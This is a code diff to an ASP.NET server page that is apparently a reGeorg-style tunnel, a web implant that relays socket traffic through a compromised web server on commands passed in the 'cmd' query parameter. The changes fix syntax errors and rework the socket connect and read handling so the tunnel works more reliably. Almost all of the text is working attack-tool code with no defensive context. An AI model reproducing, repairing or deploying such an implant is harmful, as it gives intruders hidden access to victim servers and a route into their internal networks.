@@ -5,7 +5,7 @@
 <script runat="server">
 
 
-protected void Page_Load(object sender, EventArgs e){
+public void Page_Load(object sender, EventArgs e){
     
 HttpContext.Current.Server.ScriptTimeout = 600;
 try {
@@ -13,7 +13,7 @@ try {
             Response.AddHeader("X-STATUS", "OK");
             Response.Write("Georg says, 'All seems fine'");
 
-            return
+            return;
         }
         
         String cmd = Request.QueryString.Get("cmd").ToUpper();
@@ -29,9 +29,13 @@ try {
                         listener.Start();
 
                         Socket client = listener.AcceptSocket();
-                        client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 2000);
 
                         listener.Stop();
+                        
+                        client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 2000);
+                        client.Blocking = false;
+
+                        
 
                         Session.Add("client", client);
                     
@@ -43,7 +47,7 @@ try {
                         Response.AddHeader("X-STATUS", "FAIL");
                     }
             }
-            break
+            break;
 
             case "DISCONNECT":
             {
@@ -59,7 +63,7 @@ try {
                 Session.Abandon();
                
             }
-            break
+            break;
 
             case "WRITE":
             {
@@ -79,19 +83,18 @@ try {
                     Response.AddHeader("X-STATUS", "FAIL");
                 }
             }
-            break 
+            break ;
 
             case "READ":
             {
                 Socket s = (Socket)Session["client"];
                 try
                 {
+                    int n = 0;
                     byte[] readBuff = new byte[8192];
                     try
                     {
-                        int n = s.Receive(readBuff);
-                        if(n > 0) {
-
+                        while ((n = s.Receive(readBuff)) > 0) {
                             byte[] newBuff = new byte[n];
                             Array.Copy(readBuff, newBuff , n);
 
@@ -112,7 +115,7 @@ try {
                     Response.AddHeader("X-STATUS", "FAIL");
                 }
             } 
-            break
+            break;
         }
     }
     catch (Exception exKak)
